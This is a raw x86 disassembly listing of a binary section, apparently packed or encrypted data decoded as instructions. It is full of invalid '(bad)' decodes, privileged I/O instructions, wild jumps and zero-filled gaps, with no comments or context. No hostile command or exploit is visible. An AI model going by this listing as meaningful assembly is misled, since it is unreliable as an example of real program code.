  40431e:	cdq    
  40431f:	sbb    BYTE PTR [edx],bh
  404321:	sub    dl,0xac
  404324:	and    BYTE PTR [ebx-0x5f2feeaf],dl
  40432a:	mov    eax,ds:0x7b459b4d
  40432f:	icebp  
	...
  40434c:	add    BYTE PTR [eax],al
  40434e:	fistp  DWORD PTR [ebx]
  404350:	jmp    0x42ff2498
  404355:	clc    
  404356:	jno    0x404350
  404358:	sub    ch,BYTE PTR [edi]
  40435a:	hlt    
  40435b:	retf   0x9311
  40435e:	dec    esp
  40435f:	ins    DWORD PTR es:[edi],dx
  404360:	jb     0x404388
  404362:	ds inc edx
  404364:	fstp   DWORD PTR [edx-0x636701a]
  40436a:	sahf   
  40436b:	and    ah,BYTE PTR [edx+0x45]
  40436e:	push   ss
  40436f:	add    eax,0x9a24f002
  404374:	sbb    cl,BYTE PTR [esp+ebp*2+0x58]
  404378:	push   edx
  404379:	fwait
  40437a:	icebp  
  40437b:	cmp    eax,0x139126f9
  404380:	mov    edx,DWORD PTR [edx+0x2eb1767b]
  404386:	jmp    0x4043a7
  404388:	push   0x54
  40438a:	jmp    0x40437e
  40438c:	shr    al,1
  40438e:	stos   DWORD PTR es:[edi],eax
  40438f:	aam    0x32
  404391:	pop    ebp
  404392:	xchg   ecx,eax
  404393:	imul   ebx,DWORD PTR [ecx],0x370041e1
  404399:	loope  0x4043d3
  40439b:	addr16 push edx
  40439d:	cmp    dl,BYTE PTR [edi+0x22a9ac0e]
  4043a3:	std    
  4043a4:	enter  0x8e82,0x74
  4043a8:	jg     0x40433c
  4043aa:	ins    DWORD PTR es:[edi],dx
  4043ab:	pushf  
  4043ac:	fidivr DWORD PTR [ecx+0x49f454e9]
	...
  4043ce:	add    BYTE PTR [eax],al
  4043d0:	xor    al,0x46
  4043d2:	push   ecx
  4043d3:	icebp  
  4043d4:	loope  0x404384
  4043d6:	or     BYTE PTR [esi],al
  4043d8:	(bad)  
  4043d9:	and    esp,DWORD PTR ds:0x83cbeb25
  4043df:	mov    esi,0x5d9eb996
  4043e4:	loop   0x404417
  4043e6:	add    DWORD PTR [ebp-0x6e],eax
  4043e9:	leave  
  4043ea:	sbb    al,0xe6
  4043ec:	iret   
  4043ed:	push   ds
  4043ee:	jp     0x40446d
  4043f0:	jnp    0x40441e
  4043f2:	xchg   edi,eax
  4043f3:	sahf   
  4043f4:	mov    esp,0x4910d616
  4043fa:	repz je 0x4043a9
  4043fd:	mov    eax,ds:0xb2f90e8d
  404402:	push   0x9e3ba52d
  404407:	sbb    eax,0xfe3b13c6
  40440c:	inc    ebx
  40440d:	pop    ebx
  40440e:	adc    eax,0xb069cf65
  404413:	lds    edi,FWORD PTR [ebx]
  404415:	add    DWORD PTR [ecx-0x52],ebp
  404418:	mov    WORD PTR fs:[ebp+ecx*4+0x0],es
  40441d:	in     al,0xe1
  40441f:	cmc    
  404420:	xor    dh,0xbe
  404423:	push   esp
  404424:	stc    
  404425:	jge    0x4043b5
  404427:	push   ss
  404428:	sub    eax,DWORD PTR [esi-0x1198cad5]
  40442e:	inc    DWORD PTR [ebx+edx*2]
  404431:	pop    ds
  404432:	sub    al,0xa0
	...
  404450:	add    BYTE PTR [eax],al
  404452:	jmp    0x8859d929
  404457:	add    al,0x9
  404459:	je     0x40440e
  40445b:	push   0xfd2192b1
  404460:	mov    ds:0x1b7038ef,al
  404465:	mov    cl,0x60
  404467:	rol    DWORD PTR [ebx-0x34],1
  40446a:	fstp   DWORD PTR ds:0xcb7b2afb
  404470:	jmp    0x5167e4bc
  404475:	push   es
  404476:	shr    BYTE PTR [edi-0x34],1
  404479:	arpl   WORD PTR [ebx-0x4],bp
  40447c:	jae    0x4044fb
  40447e:	jmp    0x1118aaeb
  404483:	add    eax,0xee9de
  404488:	add    BYTE PTR [esi],dh
  40448a:	adc    dh,al
  40448c:	xchg   ebp,eax
  40448d:	mov    DWORD PTR [eax],0xf9502c20
  404493:	dec    edi
  404494:	mov    edx,0x19c42dee
  404499:	sbb    DWORD PTR [edi],eax
  40449b:	mov    ah,0x8f
  40449d:	sub    BYTE PTR [edi],0x65
  4044a0:	xor    eax,0xa395326f
  4044a5:	test   edi,0xdd003277
  4044ab:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  4044ad:	mov    ebp,esp
  4044af:	cwde   
  4044b0:	push   ds
  4044b1:	push   esi
  4044b2:	fmul   st(0),st
  4044b4:	mov    al,dh
	...
  4044d2:	add    BYTE PTR [eax],al
  4044d4:	cmp    BYTE PTR [ebx+ebp*1],bh
  4044d7:	fbld   TBYTE PTR [ecx]
  4044d9:	sub    al,0xbd
  4044db:	dec    esi
  4044dc:	fld    QWORD PTR ss:[esi]
  4044df:	jns    0x40450c
  4044e1:	or     eax,0x35a90091
  4044e6:	adc    BYTE PTR [esi+ebx*2+0x32],ah
  4044ea:	and    dl,dh
  4044ec:	inc    edi
  4044ed:	sbb    al,0x71
  4044ef:	dec    eax
  4044f0:	lock sbb al,0x41
  4044f3:	fimul  WORD PTR [esi]
  4044f5:	mov    edx,0xcf997dd4
  4044fa:	in     al,0xeb
  4044fc:	add    bh,dl
  4044fe:	mov    ch,0x51
  404500:	out    0xd1,eax
  404502:	test   edi,eax
  404504:	aaa    
  404505:	push   cs
  404506:	cwde   
  404507:	push   esi
  404508:	nop
  404509:	or     DWORD PTR [eax-0x720c640],ebp
  40450f:	jp     0x4044bf
  404511:	xlat   BYTE PTR ds:[ebx]
  404512:	enter  0x30ec,0x1
  404516:	pop    esp
  404517:	dec    edi
  404518:	xlat   BYTE PTR ds:[ebx]
  404519:	add    eax,0xac3ed96c
  40451e:	cmp    al,0x63
  404520:	mov    ecx,0xff50cab
  404525:	push   cs
  404526:	and    al,cl
  404528:	cmp    BYTE PTR [ecx],cl
  40452a:	adc    BYTE PTR [esi-0x5f],bl
  40452d:	in     al,0x40
  40452f:	in     al,0x86
  404531:	jecxz  0x4045a3
  404533:	jb     0x40451d
  404535:	add    ah,ah
  404537:	rol    DWORD PTR [eax],1
	...
  404555:	add    BYTE PTR [edi],bl
  404557:	clc    
  404558:	rol    DWORD PTR [edi-0x5a],cl
  40455b:	lods   eax,DWORD PTR ds:[esi]
  40455c:	test   ch,bh
  40455e:	push   ecx
  40455f:	stos   BYTE PTR es:[edi],al
  404560:	mov    ah,0x6b
  404562:	xchg   ecx,eax
  404563:	ss test al,0xfa
  404566:	div    BYTE PTR [ecx]
  404568:	cwde   
  404569:	ins    BYTE PTR es:[edi],dx
  40456a:	lahf   
  40456b:	pop    ss
  40456c:	leave  
  40456d:	(bad)  
  40456e:	clc    
  40456f:	das    
  404570:	stc    
  404571:	inc    eax
  404572:	push   ss
  404573:	mov    esp,0xbc71e36c
  404578:	pop    esp
  404579:	jne    0x404588
  40457b:	repz aad 0xd
  40457e:	retf   0xd382
  404581:	cmp    eax,0x30cafd34
  404586:	mov    ecx,0x4700cd88
  40458b:	(bad)  
  40458d:	push   ecx
  40458e:	lea    ebx,[esi]
  404590:	aam    0x61
  404592:	sbb    edi,DWORD PTR [eax+0x75a0f477]
  404598:	jo     0x40455e
  40459a:	cs out 0x69,al
  40459d:	xchg   ebp,eax
  40459e:	je     0x4045ef
  4045a0:	outs   dx,DWORD PTR ds:[esi]
  4045a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045a2:	add    cl,bh
  4045a4:	add    DWORD PTR [eax-0x77f97155],edi
  4045aa:	adc    eax,0x7fd8ffdd
  4045af:	call   0x162a2eac
  4045b4:	sbb    eax,0x1c3f927c
  4045b9:	dec    esp
	...
  4045d6:	add    BYTE PTR [eax],al
  4045d8:	cld    
  4045d9:	push   edi
  4045da:	and    bl,BYTE PTR ds:0x2d259566
  4045e0:	shr    ah,1
  4045e2:	iret   
  4045e3:	inc    ecx
  4045e4:	popf   
  4045e5:	xchg   edi,eax
  4045e6:	enter  0xb71,0x4f
  4045ea:	shl    DWORD PTR [eax],1
  4045ec:	mov    ecx,0x2710d66d
  4045f1:	or     BYTE PTR [ebx-0x7b],dh
  4045f4:	xchg   esp,eax
  4045f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045f6:	jne    0x4045ad
  4045f8:	add    dh,BYTE PTR [esi]
  4045fa:	ins    BYTE PTR es:[edi],dx
  4045fb:	in     al,0xb0
  4045fd:	jle    0x40466a
  4045ff:	aam    0x1e
  404601:	inc    DWORD PTR [ecx+ecx*8]
  404604:	outs   dx,DWORD PTR ds:[esi]
  404605:	popf   
  404606:	add    edi,ecx
  404608:	stc    
  404609:	dec    esp
  40460a:	cli    
  40460b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40460c:	mov    esi,DWORD PTR [edi-0x3]
  40460f:	xchg   edi,eax
  404610:	adc    eax,0x1819e600
  404615:	imul   esi,ecx,0x77dae01e
  40461b:	daa    
  40461c:	sub    DWORD PTR [ebp-0xcedfb9],edx
  404622:	rcr    DWORD PTR [eax],1
  404624:	fdiv   QWORD PTR [ebx+0x21ec1fdd]
  40462a:	ins    BYTE PTR es:[edi],dx
  40462b:	es cmp eax,0xd213bc8
  404631:	ds xchg ebp,eax
  404633:	add    eax,0x3029a80
  404638:	test   al,0x28
  40463a:	imul   edi,ebx,0x0
	...
  404659:	add    BYTE PTR [esi-0x42],bl
  40465c:	adc    al,0xfc
  40465e:	dec    esi
  40465f:	push   esp
  404660:	mov    WORD PTR [ebx+0x64],?
  404663:	(bad)
  404666:	xor    al,0x4f
  404668:	bound  ebp,QWORD PTR [ebp+0x75]
  40466b:	cdq    
  40466c:	in     eax,dx
  40466d:	imul   eax,DWORD PTR [ebp+0x8c94b2b],0xf0cdf4cd
  404677:	ss xlat BYTE PTR gs:[ebx]
  40467a:	cdq    
  40467b:	mov    al,0xd2
  40467d:	rol    cl,1
  40467f:	and    dh,BYTE PTR [esi+esi*2]
  404682:	ins    BYTE PTR es:[edi],dx
  404683:	dec    eax
  404684:	add    esi,DWORD PTR [ecx+0x5c]
  404687:	mov    edx,0x340d688a
  40468c:	xchg   ebp,eax
  40468d:	outs   dx,DWORD PTR ds:[esi]
  40468e:	cmp    eax,0xb0cb339e
  404693:	inc    ecx
  404694:	fmul   st(3),st
  404696:	js     0x40466b
  404698:	dec    ebp
  404699:	aad    0xd1
  40469b:	sbb    eax,0xa7d9d2ba
  4046a0:	sub    bl,BYTE PTR ds:0x19b516b4
  4046a6:	in     al,0xac
  4046a8:	add    BYTE PTR [esi+ebp*8+0x77],al
  4046ac:	inc    esi
  4046ad:	xchg   ebx,eax
  4046ae:	jmp    0xaaee171a
  4046b3:	fdiv   QWORD PTR [edx+0x1a]
  4046b6:	or     cl,BYTE PTR ds:0x379b83e5
  4046bc:	pop    edi
  4046bd:	sub    al,0x0
	...
  4046db:	add    BYTE PTR [edi+eiz*1+0x310d99c9],dl
  4046e2:	cmp    al,0x6
  4046e4:	or     eax,DWORD PTR [ecx-0x56]
  4046e7:	ja     0x404763
  4046e9:	sti    
  4046ea:	mov    ebp,cr6
  4046ed:	or     eax,DWORD PTR [esi+0x257506be]
  4046f3:	leave  
  4046f4:	pop    es
  4046f5:	test   DWORD PTR [ebx+0x9d42f50],esi
  4046fb:	pop    ds
  4046fc:	sub    BYTE PTR [edi+ebx*4+0xea954a7],ah
  404703:	rcl    BYTE PTR [ecx-0x47],1
  404706:	cwde   
  404707:	cmp    DWORD PTR [ecx-0x78],esp
  40470a:	and    ah,BYTE PTR [esi]
  40470c:	pop    esi
  40470d:	pop    eax
  40470e:	mov    ah,0x40
  404710:	mov    ds:0x9d0f16ec,al
  404715:	cld    
  404716:	sbb    BYTE PTR [esi-0x56c4b45b],0xa0
  40471d:	sbb    ebp,DWORD PTR [ebp+0x207f76d4]
  404723:	arpl   WORD PTR [edi+0x6f],si
  404726:	mov    dh,0xea
  404728:	jl     0x4046c8
  40472a:	or     al,0x35
  40472c:	js     0x4046fc
  40472e:	call   0xb87c:0x3942bd93
  404735:	xor    ch,BYTE PTR [edi+0x14e1cbed]
  40473b:	sbb    al,ch
  40473d:	adc    DWORD PTR [ebx+0x0],eax
	...
  40475b:	add    BYTE PTR [eax],al
  40475d:	add    BYTE PTR [edi+0x58120ae1],dl
  404763:	or     edi,DWORD PTR [ebx]
  404765:	test   BYTE PTR [ecx-0x41c195f9],dh
  40476b:	or     al,0x5a
  40476d:	test   al,0x58
  40476f:	test   eax,0xac270bce
  404774:	(bad)  
  404775:	popf   
  404776:	scas   al,BYTE PTR es:[edi]
  404777:	(bad)  
  404778:	lods   eax,DWORD PTR ds:[esi]
  404779:	daa    
  40477a:	sar    ebp,0x9d
  40477d:	mov    cl,0x44
  40477f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404780:	xchg   edx,eax
  404781:	inc    esp
  404782:	jmp    0x40472a
  404784:	mov    ds:0xf20362d2,al
  404789:	push   0xfec2004d
  40478e:	or     esp,ebp
  404790:	push   esi
  404791:	pop    ebp
  404792:	hlt    
  404793:	fbld   TBYTE PTR [esi-0x35]
  404796:	pop    ebp
  404797:	adc    dh,BYTE PTR [esi]
  404799:	jno    0x40476d
  40479b:	or     DWORD PTR [esi],eax
  40479d:	out    0x12,eax
  40479f:	mov    ebx,0xd1bd761b
  4047a4:	sub    esp,eax
  4047a6:	push   esp
  4047a7:	mov    esp,0xb78b5a7a
  4047ac:	dec    edx
  4047ad:	int3   
  4047ae:	sub    eax,0xb26fdf16
  4047b3:	adc    eax,0x2f1bf9ef
  4047b8:	mov    esi,0x8e33c443
  4047bd:	aad    0xaa
  4047bf:	into   
  4047c0:	mov    ds:0xe8,eax
	...
  4047dd:	add    BYTE PTR [eax],al
  4047df:	add    BYTE PTR [ebp-0x3816c33],dl
  4047e5:	mov    ch,0xc2
  4047e7:	les    edx,FWORD PTR [ebx]
  4047e9:	mov    bh,0xf2
  4047eb:	push   edx
  4047ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4047ed:	sbb    esp,DWORD PTR [edi-0xf]
  4047f0:	dec    edx
  4047f1:	sbb    BYTE PTR [edi+0x67],dl
  4047f4:	or     eax,0xb0066ed2
  4047f9:	fbstp  TBYTE PTR [ebp+0x36]
  4047fc:	push   esi
  4047fd:	pop    edi
  4047fe:	imul   DWORD PTR [edx]
  404800:	out    0x3a,eax
  404802:	(bad)  
  404803:	sbb    cl,BYTE PTR [ecx+0x69]
  404806:	add    al,0x4a
  404808:	mov    ebx,0x2d79ffd8
  40480d:	inc    edx
  40480e:	and    al,0xef
  404810:	into   
  404811:	(bad)  
  404812:	and    edi,ebx
  404814:	inc    eax
  404815:	or     BYTE PTR [edx],bl
  404817:	mov    fs,WORD PTR [edx+0x4be1a61]
  40481d:	out    dx,al
  40481e:	and    dh,BYTE PTR [ebx-0x7cddd46f]
  404824:	pop    ss
  404825:	cld    
  404826:	sbb    dl,dl
  404828:	lods   eax,DWORD PTR ds:[esi]
  404829:	test   DWORD PTR [ebx],ebx
  40482b:	loop   0x404850
  40482d:	repz div DWORD PTR [esi+0x78]
  404831:	push   ds
  404832:	std    
  404833:	inc    esi
  404834:	push   cs
  404835:	mov    ch,0x5
  404837:	push   ss
  404838:	xchg   esp,eax
  404839:	je     0x404839
  40483b:	and    eax,0x3b6ddbfa
  404840:	and    ebp,0x66
  404843:	or     eax,DWORD PTR [eax]
	...
  404861:	add    ch,ah
  404863:	mov    ebp,0x7b9f5a6f
  404868:	je     0x4048d4
  40486a:	adc    DWORD PTR [ebp-0x30],edx
  40486d:	jmp    FWORD PTR [edx-0x6c]
  404870:	ror    edi,cl
  404872:	fadd   QWORD PTR [edx]
  404874:	retf   
  404875:	sahf   
  404876:	xchg   dh,ch
  404878:	leave  
  404879:	scas   al,BYTE PTR es:[edi]
  40487a:	sub    BYTE PTR [esi],bl
  40487c:	pop    ds
  40487d:	ret    0xbabd
  404880:	and    al,0xf2
  404882:	xor    ebp,esp
  404884:	sbb    eax,0x169491a3
  404889:	xchg   ebx,eax
  40488a:	pop    ss
  40488b:	add    BYTE PTR [ebp-0x6da8f706],al
  404891:	stc    
  404892:	and    cl,ch
  404894:	sbb    al,BYTE PTR [ecx]
  404896:	push   0xffffff83
  404898:	in     al,0x3
  40489a:	bound  ecx,QWORD PTR ds:0x7e57685c
  4048a0:	mov    ebp,DWORD PTR [ebx+0x37]
  4048a3:	adc    al,0xf2
  4048a5:	jb     0x40488d
  4048a7:	pop    ecx
  4048a8:	fnsave [ecx+0x6]
  4048ab:	call   0x84d41e2a
  4048b0:	inc    esp
  4048b1:	into   
  4048b2:	pop    ebx
  4048b3:	cli    
  4048b4:	aam    0xc7
  4048b6:	mov    ds:0x6acce270,al
  4048bb:	fisubr WORD PTR [esi-0x2c]
  4048be:	pop    edi
  4048bf:	sar    DWORD PTR [eax],cl
  4048c1:	iret   
  4048c2:	outs   dx,DWORD PTR ds:[esi]
  4048c3:	cmp    eax,0xc6c1
	...
  4048e4:	mov    esi,0x8ecdcea7
  4048e9:	sbb    DWORD PTR [eax+0x69],ebp
  4048ec:	sti    
  4048ed:	mov    edx,0x45336a17
  4048f2:	xchg   BYTE PTR [ebx-0x26],dh
  4048f5:	sahf   
  4048f6:	icebp  
  4048f7:	jo     0x4048cb
  4048f9:	xor    BYTE PTR [ecx-0x5],dh
  4048fc:	in     al,0xa1
  4048fe:	(bad)  
  4048ff:	mul    DWORD PTR [edi+ebp*1-0x4a09fe71]
  404906:	fadd   DWORD PTR [edx]
  404908:	push   ss
  404909:	dec    esp
  40490a:	jbe    0x40492d
  40490c:	sub    DWORD PTR [eax+0x166b22e1],0x48
  404913:	sbb    edx,DWORD PTR [edx]
  404915:	int3   
  404916:	not    DWORD PTR [edi]
  404918:	fidivr DWORD PTR ds:0x28ecfa89
  40491e:	xchg   esi,eax
  40491f:	stc    
  404920:	fcom   QWORD PTR [esi-0x7cf2d900]
  404926:	push   esp
  404927:	lock (bad) 
  40492a:	ret    0x24e
  40492d:	fisub  WORD PTR [eax-0x47]
  404930:	xor    DWORD PTR [esi],ecx
  404932:	mul    DWORD PTR [eax]
  404934:	lock ds dec ebp
  404937:	iret   
  404938:	and    BYTE PTR [edi],ch
  40493a:	fist   DWORD PTR [edi-0x28]
  40493d:	sbb    cl,BYTE PTR [edx-0x60]
  404940:	retf   
  404941:	dec    edx
  404942:	fsubr  QWORD PTR [ecx]
  404944:	retf   0x65fb
  404947:	mov    dh,0x0
	...
  404965:	add    dh,dl
  404967:	jmp    0x404958
  404969:	nop
  40496a:	xor    eax,0x263f5356
  40496f:	xchg   ch,al
  404971:	scas   al,BYTE PTR es:[edi]
  404972:	sbb    al,0xb7
  404974:	jg     0x40498f
  404976:	cld    
  404977:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404978:	jmp    0x1cf23e01
  40497d:	xor    esp,edi
  40497f:	ror    DWORD PTR [edx+0x3092ff9a],0x5
  404986:	frstor [edx-0x5a]
  404989:	arpl   WORD PTR [ecx],di
  40498b:	out    dx,al
  40498c:	add    al,0x2c
  40498e:	dec    edx
  40498f:	(bad)  
  404990:	xchg   edx,eax
  404991:	mov    ebp,0xca294f48
  404996:	pop    ecx
  404997:	pop    ds
  404998:	mov    edi,0x2e2a233a
  40499d:	and    eax,0x94b839f0
  4049a2:	push   ss
  4049a3:	or     eax,DWORD PTR [edx]
  4049a5:	ret    
  4049a6:	add    ebx,ebx
  4049a8:	xchg   ebx,eax
  4049a9:	popf   
  4049aa:	daa    
  4049ab:	gs aaa 
  4049ad:	stos   BYTE PTR es:[edi],al
  4049ae:	and    dh,BYTE PTR [ebp-0x5f]
  4049b1:	xor    ecx,DWORD PTR [edi+eax*8]
  4049b4:	sbb    edi,esp
  4049b6:	or     al,0x97
  4049b8:	lea    eax,[eax]
  4049ba:	hlt    
  4049bb:	add    al,BYTE PTR [eax]
  4049bd:	add    ch,ch
  4049bf:	stc    
  4049c0:	xor    BYTE PTR [ecx-0xa],al
  4049c3:	xchg   esp,eax
  4049c4:	popa   
  4049c5:	or     BYTE PTR [edi],0xc9
  4049c8:	push   edx
  4049c9:	ret    
	...
  4049e6:	add    BYTE PTR [eax],al
  4049e8:	adc    BYTE PTR [eax],cl
  4049ea:	lds    eax,FWORD PTR [ecx+edi*8]
  4049ed:	(bad)  
  4049ee:	repz inc ebp
  4049f0:	adc    bh,BYTE PTR [edx]
  4049f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049f3:	xchg   BYTE PTR [ebx],ch
  4049f5:	cmp    eax,0xb37cc796
  4049fa:	mov    cl,BYTE PTR [eax]
  4049fc:	xchg   ebp,eax
  4049fd:	sar    BYTE PTR [ebx-0x1771c1b7],0x8a
  404a04:	xchg   edi,eax
  404a05:	push   esi
  404a06:	fxch   st(3)
  404a08:	js     0x404a39
  404a0a:	dec    edi
  404a0b:	or     al,0x81
  404a0d:	dec    esp
  404a0e:	jle    0x404a5d
  404a10:	sbb    al,BYTE PTR [edx+0x7af38e2d]
  404a16:	sbb    al,0xcf
  404a18:	mov    esi,0x975112c0
  404a1d:	mov    bl,0x23
  404a1f:	adc    BYTE PTR [esi+edx*2-0x72aa2c90],bh
  404a26:	inc    ecx
  404a27:	xchg   edx,eax
  404a28:	cmp    cl,BYTE PTR [edi+edx*8+0x55]
  404a2c:	inc    ebx
  404a2d:	das    
  404a2e:	out    0x14,al
  404a30:	pop    eax
  404a31:	jp     0x4049e8
  404a33:	xlat   BYTE PTR ds:[ebx]
  404a34:	xor    DWORD PTR [ecx-0x649697c],eax
  404a3a:	xchg   edi,eax
  404a3b:	pop    ecx
  404a3c:	scas   eax,DWORD PTR es:[edi]
  404a3d:	add    ch,BYTE PTR [ecx-0x6380be8]
  404a43:	fcmovne st,st(5)
  404a45:	xchg   esp,eax
  404a46:	retf   0x529a
  404a49:	aam    0x5c
  404a4b:	pop    ebp
	...
  404a68:	add    BYTE PTR [eax],al
  404a6a:	cmp    eax,DWORD PTR [edi]
  404a6c:	ins    BYTE PTR es:[edi],dx
  404a6d:	sbb    al,0xd
  404a6f:	gs inc ebx
  404a71:	aas    
  404a72:	jmp    0x8044:0xa30e4a84
  404a79:	and    al,0xaf
  404a7b:	adc    eax,DWORD PTR [ebp+0x7276ee15]
  404a81:	inc    esi
  404a82:	sub    eax,0x6c775b15
  404a87:	mov    BYTE PTR [ecx+eiz*8-0x2f4e704d],bl
  404a8e:	jmp    0xbf70:0xf183c65a
  404a95:	mov    dl,0x28
  404a97:	fadd   QWORD PTR [esi-0x52]
  404a9a:	fstp   TBYTE PTR [di]
  404a9d:	lahf   
  404a9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a9f:	(bad)  
  404aa0:	sbb    ah,cl
  404aa2:	cmc    
  404aa3:	lods   al,BYTE PTR ds:[esi]
  404aa4:	xor    edi,ebp
  404aa6:	xor    al,0xe0
  404aa8:	repnz push 0x6b
  404aab:	neg    ecx
  404aad:	pop    ecx
  404aae:	mov    ds:0x3908fca2,al
  404ab3:	test   eax,0xddf03807
  404ab8:	cmp    eax,0x46dd7e36
  404abd:	pop    es
  404abe:	mov    edi,0xdc54343c
  404ac3:	jmp    0xf2da:0x221d6518
  404aca:	bound  edi,QWORD PTR [ecx]
  404acc:	repz rol DWORD PTR [eax],0x0
	...
  404aec:	fwait
  404aed:	and    BYTE PTR [eax],cl
  404aef:	xchg   ecx,eax
  404af0:	shl    BYTE PTR [esi],0xfd
  404af3:	lahf   
  404af4:	stc    
  404af5:	lds    eax,FWORD PTR [esp+edi*4-0x72806aca]
  404afc:	ja     0x404ab2
  404afe:	pop    edx
  404aff:	fisub  WORD PTR [edx+edx*2-0x1a108f]
  404b06:	pop    ecx
  404b07:	mov    cl,0x94
  404b09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b0a:	push   ebx
  404b0b:	pushf  
  404b0c:	lds    esp,FWORD PTR [ebp+0x28]
  404b0f:	mov    edi,0xc6312326
  404b14:	aaa    
  404b15:	in     al,0xb8
  404b17:	sub    cl,BYTE PTR [edx-0x5]
  404b1a:	iret   
  404b1b:	and    DWORD PTR [ebx+0x3c],esi
  404b1e:	stos   DWORD PTR es:[edi],eax
  404b1f:	xor    al,0x38
  404b21:	jge    0x404ab5
  404b23:	dec    edi
  404b24:	add    DWORD PTR [esi-0x178f183],edi
  404b2a:	imul   esi,ebp,0xffffff97
  404b2d:	aas    
  404b2e:	dec    edi
  404b2f:	loopne 0x404ae3
  404b31:	or     BYTE PTR [esi-0x15],0xe5
  404b35:	rol    ecx,0x63
  404b38:	shl    dl,1
  404b3a:	(bad)  
  404b3b:	push   0x8de333b9
  404b40:	jb     0x404bb6
  404b42:	fidiv  DWORD PTR [esi+0x7b]
  404b45:	mov    ch,0xc5
  404b47:	mov    bh,0xd
  404b49:	mul    DWORD PTR [ebx-0x38c82334]
  404b4f:	test   eax,0x0
	...
  404b6c:	add    BYTE PTR [eax],al
  404b6e:	out    dx,eax
  404b6f:	js     0x404b47
  404b71:	mov    ds:0x6883b9de,al
  404b76:	fmul   DWORD PTR [ebx-0x76]
  404b79:	arpl   cx,sp
  404b7b:	or     ah,BYTE PTR [ecx+0x76]
  404b7e:	sub    cl,dh
  404b80:	pop    eax
  404b81:	lea    edx,[ebx]
  404b83:	lea    eax,[edi-0x34]
  404b86:	jne    0x404bd7
  404b88:	es mov bh,0xa4
  404b8b:	push   cs
  404b8c:	add    eax,0x14d147a2
  404b91:	test   eax,0x217b9056
  404b96:	bound  eax,QWORD PTR [ebx-0x6e]
  404b99:	sub    ch,BYTE PTR [ebx]
  404b9b:	add    al,BYTE PTR [eax]
  404b9d:	test   eax,0x90de6ada
  404ba2:	fnstcw WORD PTR [ebx-0x61]
  404ba5:	(bad)  
  404ba6:	cld    
  404ba7:	adc    DWORD PTR [eax-0x12],ebx
  404baa:	adc    eax,0xe90d18e1
  404baf:	adc    ebx,edx
  404bb1:	or     al,0xea
  404bb3:	inc    eax
  404bb4:	fwait
  404bb5:	dec    esp
  404bb6:	lods   al,BYTE PTR ds:[esi]
  404bb7:	pop    ss
  404bb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404bb9:	cmp    eax,0x1ee646a7
  404bbe:	(bad)  
  404bc0:	and    al,0x1f
  404bc2:	cdq    
  404bc3:	call   0x52a2342b
  404bc8:	mov    ds:0xe2838301,eax
  404bcd:	fidiv  DWORD PTR [edi]
  404bcf:	mov    ah,0x21
  404bd1:	ret    
	...
  404bee:	add    BYTE PTR [eax],al
  404bf0:	bound  esp,QWORD PTR [ebp-0x5f5aaba0]
  404bf6:	scas   eax,DWORD PTR es:[edi]
  404bf7:	xor    eax,0x56eeb3ae
  404bfc:	mov    ds:0x10672d7e,eax
  404c01:	outs   dx,BYTE PTR ds:[esi]
  404c02:	ins    BYTE PTR es:[edi],dx
  404c03:	xor    BYTE PTR [ecx-0x24],cl
  404c06:	stos   BYTE PTR es:[edi],al
  404c07:	cmp    edx,ebx
  404c09:	or     al,0xea
  404c0b:	push   edx
  404c0c:	das    
  404c0d:	cmp    ch,BYTE PTR [ecx]
  404c0f:	dec    ebx
  404c10:	xor    al,0x2b
  404c12:	push   0xf6286e16
  404c17:	imul   DWORD PTR [edx+0x3b]
  404c1a:	mov    bh,0xd4
  404c1c:	sbb    DWORD PTR [edi],eax
  404c1e:	je     0x404c05
  404c20:	pop    eax
  404c21:	fnstenv [edx+esi*4]
  404c24:	and    esp,DWORD PTR [edx+esi*8-0x45]
  404c28:	(bad)  
  404c29:	je     0x404bde
  404c2b:	nop
  404c2c:	cmc    
  404c2d:	shl    DWORD PTR [eax-0x77],0xec
  404c31:	xchg   edx,eax
  404c32:	xor    DWORD PTR [eax],eax
  404c34:	or     edx,DWORD PTR [esi-0xd]
  404c37:	(bad)  
  404c38:	xor    ah,BYTE PTR [eax-0x3e]
  404c3b:	mov    edi,0x7c916c09
  404c40:	add    BYTE PTR [ebx+0x74a73da0],dh
  404c46:	ss cli 
  404c48:	mov    gs,WORD PTR [edi+eax*1]
  404c4b:	mov    ebx,0x785442a5
  404c50:	mov    WORD PTR ds:0x3965,ss
	...
  404c72:	(bad)  
  404c74:	cwde   
  404c75:	dec    ebx
  404c76:	push   es
  404c77:	and    al,0xa9
  404c79:	or     ch,ch
  404c7b:	inc    edi
  404c7c:	cli    
  404c7d:	leave  
  404c7e:	les    esi,FWORD PTR [eax]
  404c80:	retf   
  404c81:	mov    BYTE PTR [ebx+0x6f],dl
  404c84:	pop    ebp
  404c85:	dec    edi
  404c86:	sub    cl,BYTE PTR [eax+0x65110e6c]
  404c8c:	aas    
  404c8d:	int    0x18
  404c8f:	mov    edx,0xe5378c0e
  404c94:	adc    DWORD PTR [ebx-0x62],eax
  404c97:	cmp    esp,DWORD PTR [ebx]
  404c99:	add    dh,BYTE PTR [ebp-0x2e]
  404c9c:	outs   dx,DWORD PTR ds:[esi]
  404c9d:	sar    DWORD PTR [ebp+eax*1+0x41],0x80
  404ca2:	sbb    ecx,ecx
  404ca4:	(bad)  
  404ca5:	inc    edi
  404ca6:	and    dh,BYTE PTR [eax-0x166f91b]
  404cac:	mov    ah,0xc5
  404cae:	nop
  404caf:	mov    eax,ds:0x3bb58483
  404cb4:	mov    bl,BYTE PTR [edx]
  404cb6:	pop    esp
  404cb7:	in     al,0xba
  404cb9:	pop    ebx
  404cba:	mov    bh,0x5
  404cbc:	call   0xd912cb59
  404cc1:	fstp   DWORD PTR [ecx-0x51]
  404cc4:	dec    esi
  404cc5:	push   ds
  404cc6:	pusha  
  404cc7:	enter  0x5f7d,0xd
  404ccb:	mov    dl,0xfe
  404ccd:	sub    al,0xa1
  404ccf:	mov    dl,0x3
  404cd1:	sbb    al,0x58
  404cd3:	aas    
  404cd4:	jnp    0x404cd6
